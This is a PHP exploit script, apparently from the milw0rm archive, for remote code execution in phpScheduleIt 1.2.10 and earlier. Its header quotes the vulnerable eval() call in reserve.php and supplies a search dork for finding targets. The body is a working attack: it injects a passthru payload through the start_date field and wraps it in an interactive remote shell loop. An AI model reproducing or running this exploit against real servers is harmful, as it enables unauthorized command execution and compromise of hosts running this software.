<?php

/*
	-------------------------------------------------------------------
	phpScheduleIt <= 1.2.10 (reserve.php) Remote Code Execution Exploit
	-------------------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://phpscheduleit.sourceforge.net/
	dork.....: inurl:roschedule.php
	details..: works with magic_quotes_gpc = off
	
	[-] vulnerable code in /reserve.php
	
	51.	if (isset($_POST['btnSubmit']) && strstr($_SERVER['HTTP_REFERER'], $_SERVER['PHP_SELF'])) {
	52.		$t->set_title(translate("Processing $Class"));
	53.		$t->printHTMLHeader();
	54.		$t->startMain();
	55.	
	56.		process_reservation($_POST['fn']);
	57.	}
	58.	else {
	59.		$res_info = getResInfo();
	60.		$t->set_title($res_info['title']);
	61.		$t->printHTMLHeader();
	62.	   	$t->startMain();
	63.	   	present_reservation($res_info['resid']);
	64.	}

	[...]
	
	79.	function process_reservation($fn) {
	80.		$success = false;
	81.		global $Class;
	82.		$is_pending = (isset($_POST['pending']) && $_POST['pending']);
	83.	
	84.		if (isset($_POST['start_date'])) {			// Parse the POST-ed starting and ending dates
	85.			$start_date = eval('return mktime(0,0,0, \'' . str_replace(INTERNAL_DATE_SEPERATOR, '\',\'', $_POST['start_date']) . '\');');
	86.			$end_date = eval('return mktime(0,0,0, \'' . str_replace(INTERNAL_DATE_SEPERATOR, '\',\'', $_POST['end_date']) . '\');');
	87.		}
	
	An attacker might be able to inject and execute PHP code through $_POST['start_date'], that is passed to eval() at line 85
*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

define(STDIN, fopen("php://stdin", "r"));

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print "\n[-] No response from {$host}:80 Trying again...";
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

print "\n+---------------------------------------------------------------+";
print "\n| phpScheduleIt <= 1.2.10 Remote Code Execution Exploit by EgiX |";
print "\n+---------------------------------------------------------------+\n";

if ($argc < 3)
{
	print "\nUsage......: php $argv[0] host path\n";
	print "\nExample....: php $argv[0] localhost /";
	print "\nExample....: php $argv[0] localhost /phpscheduleit/\n";
	die();
}

$host = $argv[1];
$path = $argv[2];

$payload = "btnSubmit=1&start_date=1').\${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${die};%%23";
$packet  = "POST {$path}reserve.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Referer: {$path}reserve.php\r\n";
$packet .= "Cmd: %s\r\n";
$packet .= "Content-Length: ".(strlen($payload)-1)."\r\n";
$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
$packet .= "Connection: close\r\n\r\n";
$packet .= $payload;

while(1)
{
	print "\nphpscheduleit-shell# ";
	$cmd = trim(fgets(STDIN));
	if ($cmd != "exit")
	{
		$html  = http_send($host, sprintf($packet, base64_encode($cmd)));
		$shell = explode("_code_", $html);
		preg_match("/_code_/", $html) ? print "\n{$shell[1]}" : die("\n[-] Exploit failed...\n");
	}
	else break;
}

?>

# milw0rm.com [2008-10-01]